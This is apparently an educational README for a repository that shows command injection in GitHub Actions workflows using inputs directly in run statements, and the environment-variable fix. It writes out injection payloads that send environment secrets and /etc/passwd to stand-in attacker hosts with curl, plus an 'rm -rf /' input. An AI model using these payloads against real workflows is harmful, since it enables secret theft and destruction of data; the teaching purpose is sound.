# Vulnerable-GitHub-Inputs-POC

This repository demonstrates the security difference between using GitHub Actions inputs directly in run statements versus using environment variables.

## ⚠️ Security Warning

The `vulnerable-workflow.yml` file contains an intentional security vulnerability for educational purposes. **DO NOT use this pattern in production workflows.**

## Workflows

### 1. Vulnerable Workflow (`vulnerable-workflow.yml`)

- **Issue**: Uses `${{ inputs.user_message }}` directly in the run statement
- **Risk**: Susceptible to command injection attacks
- **Example Attack**: Input like `; curl -X POST https://attacker.com/steal --data-raw "$(env)"` would exfiltrate all environment variables (including any secrets stored in there) to an attacker controlled website.

### 2. Secure Workflow (`secure-workflow.yml`)

- **Solution**: Uses an environment variable with proper quoting
- **Protection**: The `env:` block safely handles the input, and `"$USER_MESSAGE"` treats it as a string literal

## The Vulnerability

When GitHub Actions workflows use expressions like `${{ inputs.user_message }}` directly in run statements, they create a command injection vulnerability. The input is directly interpolated into the shell command without any sanitization.

## How the Attack Works

### Vulnerable Code

```yaml
run: |
  echo ${{ inputs.user_message }}
```

### Attack Vector

If an attacker provides input like:

```
Hello; rm -rf / --no-preserve-root
```

The resulting command becomes:

```bash
echo Hello; rm -rf / --no-preserve-root
```

This executes two commands:

1. `echo Hello`
2. `rm -rf / --no-preserve-root` (attempts to delete everything)

## The Secure Solution

### Secure Code

```yaml
env:
  USER_MESSAGE: ${{ inputs.user_message }}
run: |
  echo "$USER_MESSAGE"
```

### Why This Works

1. **Environment Variable**: The input is stored in an environment variable first
2. **Proper Quoting**: Using `"$USER_MESSAGE"` treats the entire content as a string literal
3. **No Direct Interpolation**: The shell doesn't interpret special characters in the variable content

### Result

Even with malicious input like `Hello; rm -rf /`, the command becomes:

```bash
echo "Hello; rm -rf /"
```

## How to Test

1. Go to the "Actions" tab in your GitHub repository
2. Select either workflow
3. Click "Run workflow"
4. Try different inputs:
   - Normal input: `Hello World`
   - Malicious input: `; echo "This could be dangerous"`

### Expected Results

**Vulnerable Workflow**:

- Normal input works fine
- Malicious input executes additional commands

**Secure Workflow**:

- Both inputs are treated as literal strings
- No command injection possible

## Attack Example

In the vulnerable workflow, an attacker could input:

```
Hello; curl -X POST https://evil.com/exfiltrate --data "$(cat /etc/passwd)"
```
